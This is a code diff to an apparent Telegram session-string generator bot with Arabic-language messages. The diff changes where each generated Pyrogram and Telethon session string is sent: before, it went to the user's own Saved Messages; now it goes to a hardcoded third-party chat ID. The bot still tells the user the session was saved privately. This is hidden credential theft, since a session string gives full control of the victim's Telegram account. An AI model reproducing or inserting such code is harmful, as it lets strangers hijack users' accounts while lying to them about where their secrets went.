@@ -460,7 +460,7 @@ async def generator_and_about(app,m):
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = await c.export_session_string()
         await rep.delete()
-        await c.send_message('me', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
+        await c.send_message('7908905482', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
         await c.disconnect()
         await app.send_message(
           m.chat.id, text
@@ -512,8 +512,7 @@ async def generator_and_about(app,m):
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
         string_session = c.session.save()
         await rep.delete()
-        await c.send_message('me', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
-        await c.send_message('ownerID', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
+        await c.send_message('7908905482', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
         await c.disconnect()
         await app.send_message(
           m.chat.id,
